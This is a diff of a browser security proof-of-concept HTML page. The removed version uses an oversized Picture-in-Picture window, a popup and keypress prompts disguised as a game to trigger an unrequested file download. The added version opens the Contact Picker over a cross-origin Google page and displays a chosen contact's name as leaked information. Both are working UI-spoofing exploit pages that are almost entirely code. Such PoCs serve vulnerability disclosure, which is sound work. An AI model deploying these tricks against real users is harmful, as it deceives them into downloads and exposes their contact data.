@@ -1,69 +1,28 @@
-<button autofocus onclick="start()">Press 2x enter to play the game</button>
-
-
-<pre id="contents"></pre>
-
-<script>
-
-
-const pipOpen = async () => {
-  pipWindow = await documentPictureInPicture.requestWindow({
-    width: Math.pow(2,32),
-    height: Math.pow(2,32),
-  });
-  pipWindow.document.body.innerHTML = `
-  <button autofocus onclick="read=false;eval(document.querySelector('script').innerText)">Start file writing game!</button><br>
-
-  <script>
- 
-  const popup = window.open("${document.location.href}", read ? "popup-read" : "popup-write", "popup");
-  popup.resizeTo(200,200);
-  popup.moveTo(window.screenLeft + 30,window.screenTop + 30);
-  //setTimeout('window.close()',600);
-    var count = 4;
-
-	function counter() {
-
-		if ( count > 0 )
-		{
-			--count;
-			var t2 = setTimeout( counter, 1000 );
-
-			document.body.innerHTML = "<p>Please wait.... Press " + "Tab: "+count+"</p>"
-		}
-		else
-		{
-			clearTimeout(t2);
-
-			document.body.innerHTML = "<p>Press " + "Enter</p>"
-		}
-	}
-
-     var countdown_timeout = counter();
-  
-  
-
-  <${'/'}script>
-  `;
-};
-
-function download(data, filename, type) {
-  const file = new Blob([data], {type: type});
-  const a = document.createElement("a");
-  const url = window.URL.createObjectURL(file);
-  a.href = url;
-  a.download = filename;
-  document.body.appendChild(a);
-  a.click();
-}
-
-function start() {
-    pipOpen();
-}
-
-if (window.name == "popup-write") {
-  download("This is an evil executable", "harmless");
- 
-} 
-
-</script>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>PoC</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    let contacts = await navigator.contacts.select(["name"], {});
+                    document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> ${contacts[0]["name"]}</font>
+                        </h1>
+                    `);
+                })();
+                open("https://www.google.com", "PoC", "_blank");
+            }
+        </script>
+    </head>  
+    <body>
+        <br><br><br>
+        <center>
+            <h1>Click anywhere on the page to show the Contact dialog over a cross-origin page!</h1>
+        </center>
+    </body>
+  </body>
+</html>
